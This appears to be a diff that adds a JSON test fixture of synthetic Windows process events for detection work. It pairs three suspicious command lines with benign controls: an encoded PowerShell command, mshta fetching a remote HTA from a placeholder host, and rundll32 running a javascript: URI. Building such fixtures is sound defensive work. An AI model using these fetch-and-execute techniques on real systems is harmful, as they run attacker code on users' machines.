@@ -1,0 +1,42 @@
+[
+  {
+    "event_id": "SYN-001",
+    "evidence_type": "synthetic",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "LAB\\analyst"
+  },
+  {
+    "event_id": "SYN-002",
+    "evidence_type": "synthetic",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe https://example.invalid/demo.hta",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "LAB\\analyst"
+  },
+  {
+    "event_id": "SYN-003",
+    "evidence_type": "synthetic",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe javascript:Start",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "LAB\\analyst"
+  },
+  {
+    "event_id": "SYN-004",
+    "evidence_type": "synthetic-benign-control",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe notes.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "LAB\\analyst"
+  },
+  {
+    "event_id": "SYN-005",
+    "evidence_type": "synthetic-benign-control",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -File inventory.ps1",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "LAB\\analyst"
+  }
+]
